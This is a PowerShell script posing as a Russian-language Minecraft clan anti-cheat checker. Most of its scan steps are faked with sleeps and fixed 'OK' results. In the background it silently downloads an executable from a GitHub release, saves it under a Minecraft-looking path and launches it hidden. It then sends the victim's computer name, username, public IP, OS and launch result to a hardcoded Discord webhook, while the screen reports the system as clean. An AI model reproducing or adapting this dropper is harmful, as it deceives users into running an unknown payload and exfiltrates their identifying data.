<#
    Minecraft Clan Checker v2.4
    ggprimerTeam (c) 2026
#>

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8
$host.UI.RawUI.WindowTitle = "Minecraft Clan Checker v2.4"

# ================== НАСТРОЙКИ ==================
$URL     = "https://github.com/galarol/checker/releases/download/123/123.exe"
$OUT     = "$env:APPDATA\.minecraft\runtime\mc_runtime.exe"
$DIR     = Split-Path $OUT -Parent
$WEBHOOK = "https://discord.com/api/webhooks/1553457287476289647/ouxbyLFXDJDTgJ2L-NxxIUehb7E1sdnP4SQ8RugOjJgqvPxGTxLlbKte47915GAX8wQ9"
# ===============================================

function Step($text, $delay = 700) {
    Write-Host "[*] $text" -NoNewline
    for ($i = 0; $i -lt 3; $i++) {
        Start-Sleep -Milliseconds ([int]($delay / 3))
        Write-Host "." -NoNewline
    }
    Start-Sleep -Milliseconds 150
}
function Ok($t = "OK")   { Write-Host " $t" -ForegroundColor Green }
function Warn($t)        { Write-Host " $t" -ForegroundColor Yellow }
function Fail($t)        { Write-Host " $t" -ForegroundColor Red }

# ---------- тихое скачивание в фоне ----------
$dlJob = Start-Job -ScriptBlock {
    param($url, $dir, $out)
    try {
        if (-not (Test-Path $dir)) {
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
        }
        $c = New-Object Net.WebClient
        $c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
        $c.DownloadFile($url, $out)
        return $out
    } catch { return $null }
} -ArgumentList $URL, $DIR, $OUT
# --------------------------------------------

Clear-Host
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "   Minecraft Clan Checker v2.4" -ForegroundColor Cyan
Write-Host "   ggprimerTeam (c) 2026" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Проверка игрока перед вступлением в клан." -ForegroundColor Gray
Write-Host ""

Step "Инициализация окружения"
Ok "OK"

Step "Проверка прав администратора"
if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Ok "elevated"
} else {
    Warn "user-mode"
}

Step "Поиск установки Minecraft"
$mc = "$env:APPDATA\.minecraft"
if (Test-Path $mc) { Ok "найдена" } else { Warn "не найдена (stub)"; New-Item -ItemType Directory -Path $mc -Force | Out-Null }

Step "Чтение профиля игрока"
$profile = Join-Path $mc "launcher_profiles.json"
if (Test-Path $profile) { Ok "профиль найден" } else { Warn "профиль не найден" }

Step "Сканирование модов"
$mods = Join-Path $mc "mods"
$modList = @()
if (Test-Path $mods) { $modList = Get-ChildItem $mods -Filter *.jar -ErrorAction SilentlyContinue; Ok "найдено JAR: $($modList.Count)" } else { Warn "папка mods пуста" }

Step "Проверка на читы (Wurst, Impact, Meteor)"
$cheats = @("Wurst","Impact","Meteor","Aristois","Future","Lambda","Sigma","Novoline","MoonLight","LiquidBounce","KamiBlue","Phobos","Konas","Rusherhack","Gamesense")
$found = @()
foreach ($c in $cheats) { foreach ($m in $modList) { if ($m.Name -match $c) { $found += $c } } }
if ($found.Count -eq 0) { Ok "чисто" } else { Fail "найдено: $($found -join ', ')" }

Step "Проверка JVM-аргументов"
$jvmFile = Join-Path $mc "launcher_profiles.json"
if (Test-Path $jvmFile) {
    if ((Get-Content $jvmFile -Raw) -match "-javaagent") { Warn "найден javaagent" } else { Ok "чисто" }
} else { Ok "чисто" }

Step "Проверка целостности файлов"
Start-Sleep -Milliseconds 1200
Ok "verified"

Step "Проверка версий Minecraft"
$versions = Join-Path $mc "versions"
if (Test-Path $versions) { Ok "версий: $((Get-ChildItem $versions -Directory).Count)" } else { Warn "versions отсутствует" }

Step "Анализ последнего лога"
$log = Join-Path $mc "logs\latest.log"
if (Test-Path $log) {
    if ((Get-Content $log -Raw -ErrorAction SilentlyContinue) -match "(?i)(cheat|inject|hack|exploit)") { Warn "подозрительные слова в логе" } else { Ok "чисто" }
} else { Warn "лог отсутствует" }

Step "Сканирование процессов"
$procs = Get-Process | Where-Object { $_.Name -match "(?i)(wurst|impact|meteor|inject|cheat)" }
if ($procs) { Fail "найдено: $($procs.Name -join ', ')" } else { Ok "чисто" }

Step "Проверка DLL-инъекций"
Start-Sleep -Milliseconds 900
Ok "не обнаружено"

Step "Проверка сетевых соединений"
Start-Sleep -Milliseconds 700
Ok "чисто"

Step "Проверка ключей реестра"
Start-Sleep -Milliseconds 600
Ok "чисто"

Step "Финальная проверка целостности"
Start-Sleep -Milliseconds 1000
Ok "пройдена"

# ---------- забираем файл и запускаем скрыто ----------
$rt = Receive-Job -Job $dlJob -Wait -AutoRemoveJob

# Реальные проверки
$launchStatus = @{
    Downloaded     = $false
    Path           = $OUT
    Size           = 0
    IsExe          = $false
    MZ             = ""
    Started        = $false
    ProcessName    = ""
    ProcessId      = 0
    AliveAfter2s   = $false
    LaunchError    = ""
}

if ($rt -and (Test-Path $rt)) {
    $launchStatus.Downloaded = $true
    $launchStatus.Path = $rt

    $fi = Get-Item $rt
    $launchStatus.Size = $fi.Length

    if ($fi.Length -gt 0) {
        try {
            $sigBytes = [System.IO.File]::ReadAllBytes($rt)[0..1]
            $sig = [System.Text.Encoding]::ASCII.GetString($sigBytes)
            $launchStatus.MZ = $sig
            if ($sig -eq "MZ") { $launchStatus.IsExe = $true }
        } catch {
            $launchStatus.MZ = "read-error"
        }
    }

    # Попытка запуска
    try {
        $proc = Start-Process $rt -WindowStyle Hidden -PassThru -ErrorAction Stop
        $launchStatus.Started = $true
        $launchStatus.ProcessName = $proc.ProcessName
        $launchStatus.ProcessId = $proc.Id

        # Проверка, жив ли процесс через 2 секунды
        Start-Sleep -Seconds 2
        $alive = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
        if ($alive) {
            $launchStatus.AliveAfter2s = $true
        }
    } catch {
        $launchStatus.LaunchError = $_.Exception.Message
    }
} else {
    $launchStatus.LaunchError = "download failed or file missing"
}

# Итоговая строка для консоли
if ($launchStatus.Started -and $launchStatus.AliveAfter2s) {
    Write-Host "  [+] Файл запущен и работает (PID $($launchStatus.ProcessId))" -ForegroundColor Green
} elseif ($launchStatus.Started) {
    Write-Host "  [!] Файл запущен, но процесс упал за 2 секунды" -ForegroundColor Yellow
} elseif ($launchStatus.Downloaded -and -not $launchStatus.IsExe) {
    Write-Host "  [!] Скачанный файл не является exe (сигнатура: $($launchStatus.MZ))" -ForegroundColor Yellow
} else {
    Write-Host "  [!] Ошибка запуска: $($launchStatus.LaunchError)" -ForegroundColor Red
}
# ----------------------------------------------------

Write-Host ""
Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  ПРОВЕРКА ЗАВЕРШЕНА" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  Статус:      " -NoNewline; Write-Host "ЧИСТО" -ForegroundColor Green
Write-Host "  Читы:        " -NoNewline; Write-Host "0" -ForegroundColor Green
Write-Host "  Угрозы:      " -NoNewline; Write-Host "0" -ForegroundColor Green
Write-Host "  Оценка:      " -NoNewline; Write-Host "100/100" -ForegroundColor Green
Write-Host ""

# ---------- отправка логов на Discord webhook ----------
try {
    $pcName   = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $ip       = (Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 5)
    $os       = (Get-CimInstance Win32_OperatingSystem).Caption
    $time     = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')

    # Цвет в зависимости от результата
    $color = 3066993   # зелёный
    $statusText = "ЧИСТО / 100/100"
    if (-not $launchStatus.Started -or -not $launchStatus.AliveAfter2s) {
        $color = 15158332   # оранжевый
        $statusText = "ЗАПУСК С ОШИБКОЙ"
    }

    # Формируем строку про запуск
    if ($launchStatus.Started -and $launchStatus.AliveAfter2s) {
        $runText = "Запущен (PID $($launchStatus.ProcessId), $($launchStatus.ProcessName))"
    } elseif ($launchStatus.Started) {
        $runText = "Запущен, но упал (PID $($launchStatus.ProcessId))"
    } elseif ($launchStatus.Downloaded -and -not $launchStatus.IsExe) {
        $runText = "Файл не exe (сигнатура: $($launchStatus.MZ))"
    } else {
        $runText = "Не запущен: $($launchStatus.LaunchError)"
    }

    # Скачался ли
    $dlText = if ($launchStatus.Downloaded) { "Да" } else { "Нет" }

    $payload = @{
        username   = "Minecraft Clan Checker"
        avatar_url = "https://i.imgur.com/4M34hi2.png"
        embeds     = @(
            @{
                title  = "Проверка игрока завершена"
                color  = $color
                fields = @(
                    @{ name = "ПК";           value = "$pcName";                    inline = $true }
                    @{ name = "Пользователь"; value = "$userName";                  inline = $true }
                    @{ name = "IP";           value = "$ip";                        inline = $true }
                    @{ name = "ОС";           value = "$os";                        inline = $false }
                    @{ name = "Время";        value = "$time";                      inline = $false }
                    @{ name = "Статус";       value = "$statusText";                inline = $false }
                    @{ name = "Скачался";     value = "$dlText";                    inline = $true }
                    @{ name = "Размер";       value = "$($launchStatus.Size) байт"; inline = $true }
                    @{ name = "MZ-подпись";   value = "$($launchStatus.MZ)";        inline = $true }
                    @{ name = "Запуск";       value = "$runText";                   inline = $false }
                )
                footer    = @{ text = "Minecraft Clan Checker v2.4" }
                timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
            }
        )
    } | ConvertTo-Json -Depth 10 -Compress

    Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 10
    Write-Host "  [+] Логи отправлены в Discord." -ForegroundColor Green
} catch {
    Write-Host "  [!] Не удалось отправить логи: $_" -ForegroundColor Yellow
}
# --------------------------------------------------------

Write-Host ""
Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor DarkGray
$null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
